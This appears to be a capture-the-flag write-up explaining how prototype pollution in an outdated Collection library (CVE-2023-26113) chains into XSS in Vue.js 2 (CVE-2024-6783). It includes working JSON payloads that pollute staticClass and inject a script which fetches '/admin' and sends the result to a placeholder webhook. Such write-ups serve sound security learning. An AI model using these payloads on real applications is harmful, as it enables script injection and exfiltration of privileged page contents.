
# CVE Challenge: Prototype Pollution and XSS Exploit

This challenge involves a CVE-related vulnerability that results in prototype pollution, which can then be exploited to achieve XSS through a secondary vulnerability in Vue.js.

## Vulnerability Overview

### CVE-2023-26113: Prototype Pollution

The application uses an outdated version of the Collection library, which is vulnerable to CVE-2023-26113. This vulnerability allows for prototype pollution. The issue lies in the `create.js` file with the following code:

```javascript
$C.extend(true, points, data);
```

This function uses `.apply` without checking for `getOwnProperty`, allowing the `points` array to be polluted since `data` can be any JSON input provided by the user.

### CVE-2024-6783: Vue.js XSS via Prototype Pollution

The prototype pollution vulnerability can be exploited through CVE-2024-6783, a known issue in Vue.js 2 that allows XSS if prototype pollution is present. By polluting `Object.prototype.staticClass` with malicious script content, arbitrary code execution can be achieved.

## Exploitation Steps

### Step 1: Pollute the Prototype

You can begin by polluting the prototype using the following JSON payload:

```json
{"__proto__": 
    {"__proto__": 
        {"staticClass":"JSCODEHERE"}
    }
}
```

### Step 2: Insert Malicious Script

This pollution doesn't immediately trigger the vulnerability because the `staticClass` usage is wrapped in a `with(this)` enclosure. However, by inserting your own `<script>` element into the page, you can execute arbitrary code. Here's an example:

```javascript
_c('script',[_v('fetch(`/admin`).then(res=>res.text()).then(dat=>fetch(`webhook?`%2bdat))')])
```

The `_c` function creates a new element in Vue, and the second input array is the content of that element.

### Combined Exploit

By combining these techniques, you can create a payload that looks like this:

```json
{"__proto__": 
    {"__proto__": 
        {"staticClass":"'',attrs:{'id':'main-app'}},[_c('h1',[_v('Main Vue Content')]),_v(' '),_c('script',[_v('fetch(`/admin`).then(res=>res.text()).then(dat=>fetch(`{webhook}?`%2bdat))')]),_v(' '),_c('div',{staticClass:'',attrs:{'id':'dynamic-component'}}])}\/\/"}}
}
```

This payload effectively exploits the prototype pollution to inject and execute JavaScript code on the vulnerable page.
